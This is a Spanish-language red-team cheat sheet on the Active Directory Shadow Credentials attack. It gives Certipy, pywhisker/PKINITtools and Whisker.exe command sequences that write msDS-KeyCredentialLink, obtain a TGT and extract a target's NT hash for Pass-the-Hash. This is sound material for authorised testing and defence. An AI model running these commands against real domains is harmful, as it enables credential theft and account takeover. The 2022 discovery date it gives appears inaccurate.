## Shadow Credentials (AddKeyCredentialLink)

El ataque de Shadow Credentials permite obtener el hash NT de un usuario objetivo para usarlo posteriormente en un ataque Pass-the-Hash.

**Requisitos:**
- Permisos suficientes para escribir en el atributo `msDS-KeyCredentialLink`
- PKINIT habilitado en Kerberos en el entorno objetivo

Consultar BloodHound para confirmar si este vector está disponible en el caso concreto.

---

### Contexto

El ataque fue descubierto y presentado en 2022 por **Elad Shamir** y **Michael Grafnetter**, quienes demostraron cómo abusar del atributo `msDS-KeyCredentialLink` para conseguir persistencia sigilosa en entornos de Active Directory mediante autenticación basada en certificados.

---

## Desde Linux (externamente — recomendado)

### Con Certipy (recomendado)

**Requisito:** Instalar `certipy` o `certipy-ad` en Kali y **actualizarlo a la última versión**:
https://github.com/ly4k/Certipy/wiki/04-%E2%80%90-Installation

```shell
# Con contraseña
<comando de sync kerberos> ; certipy shadow auto -u <usuario_controlado>@<dominio> -p <contraseña> -account <usuario_objetivo>

# Con hash NT (Pass-the-Hash)
<comando de sync kerberos> ; certipy shadow auto -u <usuario_controlado>@<dominio> -hashes :<hash_nt> -account <usuario_objetivo>
```

---

### Con pywhisker

**Requisitos:** Obtener las siguientes herramientas:
- https://github.com/ShutdownRepo/pywhisker
- https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py
- https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py

```shell
# 1. Añadir credencial al objetivo
pywhisker -d "<dominio>" -u "<usuario_controlado>" -p "<contraseña>" --target "<usuario_objetivo>" --action "add"

# 2. Obtener el TGT con el certificado generado
<comando de sync kerberos> ; gettgtpkinit.py -cert-pfx <cert_anterior>.pfx -pfx-pass <pass_anterior> <dominio>/<usuario_controlado> <usuario_objetivo>.ccache

# 3. Exportar el ticket
export KRB5CCNAME=<usuario_objetivo>.ccache

# 4. Extraer el hash NT
getnthash.py -key <clave_obtenida> <dominio>/<usuario_objetivo>
```

---

## Desde Windows (internamente)

### Con Whisker.exe

Subir `Whisker.exe` a la máquina objetivo y ejecutar:

```powershell
# Añadir credencial al objetivo (genera certificado y contraseña)
./Whisker.exe add /target:<usuario_objetivo>

# Listar credenciales del objetivo
./Whisker.exe list /target:<usuario_objetivo>

# Eliminar credencial del objetivo
./Whisker.exe remove /target:<usuario_objetivo>
```

> 💡 El certificado y la contraseña generados por `Whisker.exe` pueden usarse externamente con `gettgtpkinit.py` y `getnthash.py` siguiendo el mismo flujo que con pywhisker.

---

### Referencias

- https://www.hackingarticles.in/shadow-credentials-attack/
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials
- https://bloodhound.specterops.io/resources/edges/add-key-credential-link
